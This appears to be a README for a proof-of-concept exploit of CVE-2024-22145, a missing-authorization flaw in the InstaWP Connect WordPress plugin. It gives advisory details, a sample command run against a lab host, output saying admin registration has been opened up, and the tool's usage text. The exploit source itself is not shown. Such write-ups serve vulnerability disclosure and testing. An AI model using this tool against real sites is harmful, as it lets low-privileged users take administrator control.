# CVE-2024-22145
InstaWP Connect &lt;= 0.1.0.8 - Missing Authorization to Arbitrary Options Update (Subscriber+)

### Description:
The InstaWP Connect – 1-click WP Staging & Migration plugin for WordPress is vulnerable to unauthorized modification of data due to a missing capability check on the save_management_settings function in all versions up to, and including, 0.1.0.8. This makes it possible for authenticated attackers, with subscriber access and above, to modify

```
Severity: high
CVE ID: CVE-2024-22145
CVSS Score: 8.8
CVSS Metrics: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H
Plugin Slug: instawp-connect
WPScan URL: https://www.wpscan.com/plugin/instawp-connect
Reference URL: https://www.wordfence.com/threat-intel/vulnerabilities/id/6aa4fd08-a1b1-4f61-a9d1-9812071b61c9?source=api-prod
```

POC
---

```
$ python3 CVE-2024-22145.py -u http://wordpress.lan -un user -p useruser1
The plugin version is below 0.1.0.9.
The plugin version is 0.1.0.7
Vulnerability check: http://wordpress.lan
Logged in successfully.
Option set successfully: http://wordpress.lan/wp-admin/admin-ajax.php
Option set successfully: http://wordpress.lan/wp-admin/admin-ajax.php
You can now register a user as an admin user. Remember to run --fix yes after you have registered to prevent others exploiting the site.
```

Usage
---

```
usage: CVE-2024-22145.py [-h] -u URL [-un USERNAME] [-p PASSWORD] [-f FIX]

InstaWP Connect <= 0.1.0.8 - Missing Authorization to Arbitrary Options Update Description: The InstaWP Connect – 1-click WP Staging & Migration plugin for WordPress is vulnerable to unauthorized modification of data due to a missing
capability check on the save_management_settings function in all versions up to, and including, 0.1.0.8. This makes it possible for authenticated attackers, with subscriber access and above, to modify CVE-2024-22145

options:
  -h, --help            show this help message and exit
  -u URL, --url URL     Website URL
  -un USERNAME, --username USERNAME
                        WordPress username
  -p PASSWORD, --password PASSWORD
                        WordPress password
  -f FIX, --fix FIX     Reset after Exploit
```
